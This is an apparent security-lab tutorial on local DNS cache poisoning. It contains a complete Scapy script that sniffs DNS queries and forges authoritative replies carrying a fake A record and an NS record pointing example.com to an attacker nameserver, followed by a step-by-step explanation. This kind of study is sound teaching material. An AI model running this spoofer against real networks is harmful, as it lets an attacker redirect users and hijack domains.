# 🧪 04-04: Local DNS Cache Poisoning (Reply Spoofing - Lab Use Only)

📌 Basic Definition

DNS Cache Poisoning is an attack where a malicious actor injects false DNS records into a DNS server’s cache.

👉 As a result:

Users are redirected to wrong (attacker-controlled) IP addresses
Even though they typed the correct domain name
🧠 Simple Idea (Beginner Friendly)

Normal DNS flow:

User → DNS Query → DNS Server → Real IP → User

After attack:

User → DNS Query → Attacker sends fake reply → Wrong IP cached → User redirected

💥 The DNS server believes the attacker’s fake response

⚠️ Key Concept (VERY IMPORTANT)

DNS uses UDP (connectionless)

👉 That means:

No handshake
No verification
First valid response wins

🔥 So attacker tries to:

“Reply faster than the real DNS server”

---

# 🧪 Local DNS Cache Poisoning (Reply Spoofing - Lab Use Only)


from scapy.all import *

def spoof_dns(pkt):
    # Step 1: Check if packet contains DNS query
    if DNS in pkt and pkt[DNS].qd is not None:
        qname = pkt[DNS].qd.qname.decode()

        # Step 2: Target specific domain
        if "www.example.com" in qname:
            print("[*] Spoofing:", qname)

            # -------------------------------
            # Step 3: Fake IP header
            # -------------------------------
            IPpkt = IP(
                dst=pkt[IP].src,   # send back to victim
                src=pkt[IP].dst    # pretend to be DNS server
            )

            # -------------------------------
            # Step 4: Fake UDP header
            # -------------------------------
            UDPpkt = UDP(
                dport=pkt[UDP].sport,  # victim port
                sport=53               # DNS port
            )

            # -------------------------------
            # Step 5: Fake Answer (IP)
            # -------------------------------
            Anssec = DNSRR(
                rrname=pkt[DNS].qd.qname,
                type='A',
                rdata='1.2.3.4',   # fake IP
                ttl=259200
            )

            # -------------------------------
            # Step 6: Authority Section (Poisoning)
            # -------------------------------
            NSsec = DNSRR(
                rrname="example.com",
                type='NS',
                rdata='ns.attacker32.com',
                ttl=259200
            )

            # -------------------------------
            # Step 7: Build DNS Response
            # -------------------------------
            DNSpkt = DNS(
                id=pkt[DNS].id,  # must match request
                qr=1,            # response
                aa=1,            # authoritative
                rd=0,

                qd=pkt[DNS].qd,
                qdcount=1,
                ancount=1,
                nscount=1,

                an=Anssec,
                ns=NSsec
            )

            # Step 8: Combine full packet
            spoofpkt = IPpkt / UDPpkt / DNSpkt

            # Step 9: Send fake response
            send(spoofpkt, verbose=0)


# Step 10: Sniff DNS traffic
sniff(
    filter="udp port 53",
    prn=spoof_dns,
    store=0
)

---

🧩 Step-by-Step Explanation (VERY CLEAR)
🟢 Step 1: Capture DNS Packet
if DNS in pkt

👉 Check if packet contains DNS data

🟢 Step 2: Extract Domain
qname = pkt[DNS].qd.qname.decode()

👉 Example:

www.example.com
🟢 Step 3: Target Domain
if "www.example.com" in qname

👉 Only attack specific domain

🔵 Step 4: Fake IP Header
IP(dst=pkt[IP].src, src=pkt[IP].dst)

👉 Trick:

Swap source & destination
Pretend to be DNS server
🔵 Step 5: Fake UDP Header
UDP(dport=pkt[UDP].sport, sport=53)

👉 Important:

Source port must be 53 (DNS)
Destination = victim’s port
🟡 Step 6: Fake Answer
rdata='1.2.3.4'

👉 This is the malicious IP

🔴 Step 7: Authority Poisoning (VERY IMPORTANT)
ns.attacker32.com

👉 This is the real attack power

It tells DNS:

“For example.com, use attacker’s DNS server”

💥 Now attacker controls entire domain

📦 Step 8: Build DNS Packet
id=pkt[DNS].id

👉 Must match request → otherwise rejected

🚀 Step 9: Send Fake Reply
send(spoofpkt)

👉 If attacker wins the race → cache poisoned

🔄 Step 10: Sniff Traffic
sniff(filter="udp port 53")

👉 Listen for DNS queries continuously

🎯 Final Intuition (VERY IMPORTANT)
Component	Role in Attack
Answer	Fake IP redirect
Authority	Take control of domain
UDP	No verification → easy spoof
ID match	Makes packet look legit
💥 What Happens After Attack

DNS server caches:

www.example.com → 1.2.3.4
example.com → ns.attacker32.com
Future queries:
👉 Go to attacker-controlled server

---